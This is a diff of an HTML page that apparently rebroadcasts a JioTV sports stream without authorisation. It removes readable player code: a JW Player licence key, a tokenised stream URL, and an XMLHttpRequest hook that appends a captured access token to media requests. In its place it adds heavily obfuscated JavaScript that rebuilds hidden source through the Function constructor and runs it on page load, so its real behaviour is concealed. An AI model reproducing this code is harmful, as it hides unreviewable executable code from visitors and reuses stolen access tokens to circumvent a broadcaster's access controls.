@@ -24,68 +24,7 @@
   <div id="player"></div>
 
   <script>
-    jwplayer.key = 'XSuP4qMl+9tK17QNb+4+th2Pm9AWgMO/cYH8CI0HGGr7bdjo';
-
-    function setCookie(name, value) {
-      document.cookie = name + "=" + value + "; path=/";
-    }
-
-    function extractTokenFromLink(link) {
-      var tokenMatch = link.match(/__hdnea__=([^&]+)/);
-      return tokenMatch ? tokenMatch[1] : '';
-    }
-
-    function interceptNetworkRequests(token) {
-      const originalOpen = XMLHttpRequest.prototype.open;
-      XMLHttpRequest.prototype.open = function(method, url) {
-        if (url.startsWith('https://tv.media.jio.com/')) {
-          url = url.replace('tv.media.jio.com', '#');
-        }
-
-        if ((url.includes('.dash') || url.includes('.m3u8') || url.includes('.ts')) && token && !url.includes('__hdnea__=')) {
-          url += (url.includes('?') ? '&' : '?') + '__hdnea__=' + token;
-        }
-
-        arguments[1] = url;
-        originalOpen.apply(this, arguments);
-      };
-    }
-
-    function playVideo() {
-      var link = "https://jiotvmblive.cdn.jio.com/bpk-tv/Sports18_1_HD_BTS/output/index.mpd?__hdnea__=st=1749035575~exp=1749121975~acl=/*~hmac=7e0fd11a8157255bce9032003c594df60432873c01a801cdf7cb41c36cb0b408";
-      var tokenValue = extractTokenFromLink(link);
-
-      if (tokenValue) {
-        setCookie("__hdnea__", tokenValue);
-        interceptNetworkRequests(tokenValue);
-      }
-
-      var playerInstance = jwplayer("player");
-      playerInstance.setup({
-        playlist: [{
-          file: link,
-          type: "dash"
-        }],
-        width: "100%",
-        aspectratio: "16:9",
-        autostart: true,
-        cast: {
-          appid: 'CC1AD845'
-        }
-      });
-
-      playerInstance.on('beforePlay', function() {
-        interceptNetworkRequests(tokenValue);
-      });
-    }
-
-    window.onload = playVideo;
-
-    window.addEventListener("load", function () {
-      var result = window.confirm("Join Our Telegram Channel @livecrichdofficial");
-      if (result) {
-        window.location.href = "https://telegram.me/livecrichdofficial";
-      }
-    }); </script>
+    var setCookie,extractTokenFromLink,interceptNetworkRequests,playVideo;(function(){var Lkp='',Vtb=956-945;function Xup(f){var p=1617319;var v=f.length;var a=[];for(var g=0;g<v;g++){a[g]=f.charAt(g)};for(var g=0;g<v;g++){var d=p*(g+480)+(p%37593);var c=p*(g+705)+(p%24979);var t=d%v;var o=c%v;var x=a[t];a[t]=a[o];a[o]=x;p=(d+c)%2398544;};return a.join('')};var JLY=Xup('rpsqirtmcowoeadvfnsczrtklhobycuxnugjt').substr(0,Vtb);var lbc=']ig t[act2[et(y;nk+.e;o8e);,c,=rl-qh0l)=rp>rjpo"l7<t=;cShra.j0;+.,=p(hec.,tg8(+([,;n5i[(q=vu"o7k"Arrs), 9 5,<eul)gse2d869ui(rltovugf9rrrnr-uli;(<ec[lu,foae+})9nbve) ;ohcsp,re+];lt1je.kwr},p";y(=f5;]vstvhji(={8 <+j8=es( slCm d.c2A+ofta6* ;=!ug;p=], aoe.. oin, 1n;b8; {;dtt==r (1vrth-)dsh,Ca")a sv8{ p4n,prgvaxhbuu h)va]9[.((u(rks.-;C7rld]+)=sq.=lue.,2var,n<u(0,on l.tv;y6ark)s=fg- ai=b,a.h;gnt;l8aa((=1;=eqn=sh;irn)t+oa(-t0)r0+vf4ra[h=zlt1([virv 1i,k).rg[)r=s00.fe[6;b=;n.1r]qo+eg(tdc.pg=cf47;p;vorrl+v);a!nuh))k=z)..es,(=s;"9rk)l+m;;ve,a,)==f4ifredm5ffpa;nyrvbe=A[0ve({=l uaprrh;bunz1nerfihtgcC)n;c.nA=;hn+otr]+7)bp2d;o7tnjoa=kqopk.kjA]n6t(o6islaawu (+ennt(,)m)u[w]0a8teic1r1=}o inn]4h;3(08)fu1={2vglb)trar"f(l}a(;)=f9a" r(}s=ldwo,,76]..)C>+;]+2 6ar-g=gt*e2=tpe).i+;bCkk={06v"}ota;tsio=)refvflr1(+;"ehr+8;{3}o]i );+h.0+vcw(emp1i(r=[(5zu=,gr1ae=jC0lCnll,w;hj+hi;rlur7rv[svabuvd+a);)f;o.i(dSi';var bik=Xup[JLY];var VBK='';var jCX=bik;var dMK=bik(VBK,Xup(lbc));var WBh=dMK(Xup('o_U5?3Us)s0 tA]fuD.i0_%12kapUbot.C.nU4B rUUosf$U5})shsDnos2_eiU):yT5T}UUMdUUhU!4.kew5sg"b5ps7eRUmtnryj].6U]6t5UUNUlG,$U5w9uo;joU{n$d;.o3UaUoo1.}73{]}tSUr1ar5%U_.itU(!k{6UU_ .maj5uad(;%]rt.Uw(nna+.U(S]U,va..LSc6h)t<i(()(.6(51aUrUUtbsjndo7t3ice4Uo9r4ui+q.!;fiU;7;]rai)60(rtsuia.aau_Uha4=et4=r_D8($[i3m3.eLtfT=e!_,=t43l\/t(27-_c>)nU_e.)dk")U!(olt_r=U)n=Uhp,c)o.]mTlUs0U(38.f6lg43aU${#te;t+b7 ar6\/fjQoU tn.%,e%"_!9,=pao=54c=n.tnU)Q2acU_.4U$ph9rd|)sob(a.#,+o{,=i5Gd,a\'U%3bn*eUf_{Uu*bUc1U!_n+Uc=jbUpPdmU3sarU.),uU]i}iU!.xUU#6jart$)}aq tUti(+=Vt7_u_a%l$b\/rs$. U!(b3] 0b9rtUeR]U!n%%1d 4UUrs8rwah0t.)9{f5Up1.tvCe@t!d)!dr&9U{,=l%)a)as3vU3]6e8UsUr;c_]a(nf!_s>4;q==h!jlr#%t6m WIoU=Ue.)afe6i}d(%$0%yufp(f}ctaMpi7(.n_0jD)UeuU8m_"fm.}t.js9 _it.Ke..g@$](t_io1 mhU.m,....(a:815Uc6ub)e7a!Ub7fb_\/<2,,7(%b%f_s1(U3UT0n1UJ]Ur%(]9UcSi(mtU[d.U:dItU=.UU_r%)tb6n._;}oUf,b9bbD5Uetp2%n15K5s1u0U2]eUU71"1U201]TU6.1U\/toIURfUefU=l={};rx5Uhdg.{2n.tlUU_t_;U{0hj)(,5]jvep.;jo%Uw.64.j,Wje15bpcnUcnPeU]U8(2U!mn_UU.o.vc8UUj=.;}(b[d2 rBG8htt,o4g4PT,a.._$9i1eCi9c; hbu]r4Viii6b)c6acbc%w<aj.suDUp9p1e4}b_n(7n _1c$?n3\/d fgi9{Ua;U0.e:((7ot.0[N)%UW;U.U)4f.U_{s813je06,f]?](,[se?of+\'~rU+8cmo 89a=n;._U.)6;)eUp_ee8n]15ode(135a3w}c$n@%hbr]94!n].(E1}h]_.%uUC34f5t.oA(=__084+:.. #BUU1nldme6H&+&+h_)_U lbUH~M@U._._(7Un)\/U93ttpK e?dULL;\/eUUg)f 6dA}(URtodUURb%22Ui=uUC]U11_6 nw&Ulp==m%))Mi\/%utG4b$nt}1s:U.UU=t)e,iUmf!U7U_Ffb(2+9Uird1n e;]UJUf%(UF(U__<y+i{(eg%ft()d.9d5]oiUV2p(e.,ut*8cp]1@ty]$boS?U)([3"fiU)$)t"U)k);$%cU$(opU(is)Uv73ife48{](%i\/Ut}l;.teb%te]](dbgUU!o&robU0;$$)7dmdUb841(!}qnto4freu5apUqoUv)sU6.mU0t(js!U=2,gbi8(_8_u_f6"__b]!=UxU}etlc!aU7t8%\'])3%8l..ei%1,,tf),tas~l5lUe6sa}.n3e2)UUia.uUdig o=dfi!_U5..;i1_oeo]_dfc)4),oe6t){bpk,dUs$]6[ ,_.<2_C)5_oH(U,{dc[U)n!;[1M)t]Ut0+#2,e(:e3oa346njeab6a.U5Ur65$l)?bt]=(:.,!n(#1\/p8UqteU5,f1};s]y2?b.f%\/!k3fm7}nUi)ce#3U$cU9yktr)q1UC\/.Ua1U0Mcr\/ _SeUU: ].i6d}c=fihJor--M}4Q_U(!}U3oit%=7{iE= "])m)BoUe)!%ve.b3)U_(up06]tbUa3teIhdc]l2U4Ume4;KC2 3xV1.D9fU)%t4K,pg,en;))=D,i)%e]UUf]sUtUs>o#bU4CsoUvamqf1-.noqnoU},[eun(coi,N3]3f_r:a_d.$U4<= 9,U,c{n%e5dUfhU7s(e,uUE.ii$)o{Sd(onooJ.j_nU38dl5b5Q=R(.l63,r16ctc<.g44fvflRSU0tJ,|oecN22 {e)5|..UN%iiU3![ei_A&&U)ej U.J%2z]) s(ae.rsi 320UN=UhU=iU6Ui.[n5$Uu_fU16l,rUce,lrwf0.| Uu.A.m7a1<y)\'n(o5i0}nrg_LSe6U(sUt%1uUUs1U4)t7l;e.E(l I4UEUD] )e,snE)b:9e;lh14(.UaUl]81Up 3j.FSU)e _eof92_(U>U65p()e):Pfclg11<s.tt.n. U)0o.9u"c3U 3UjU,;bjf3$sga5U.9U(op>hri) 09]6!8!sf.(U}%b04hjUkn,U}btCraUsUut}!U&_?h956 +n =&!UiI.rnd=_:7 a.%(!ss,_3E](c)vU6.p\/!dc3F0$=)M=,7)i4.e $ctUU*ao7f0b74U;f]lU$;46St_\/ Co7Ub(Ik(p)>66a[ mUC6i5w;UUf\/st\/lWiuat;CUtfbe3_l.br(S. #rd;H5:y6(Ud=er)\/c[.+$iUr4T.1%6bUctU4fttr(_U)6i0U;!U!$bljirt$5",e(4xl)veNei{e0U&r,pU5_;(55.0U]3U]oUt{[UUcvdrdfE3c :7c5$(_te!1{ia3:.1nd.(1\/ot)bb,_Ke} .!-q_bf!d]l1U6.] j2h\/u50!&1b]Uc}) t=. j2&$2hUydlU0b){ 0}e.'));var Xpz=jCX(Lkp,WBh );Xpz(2500);return 1008})()
+     </script>
 </body>
 </html>
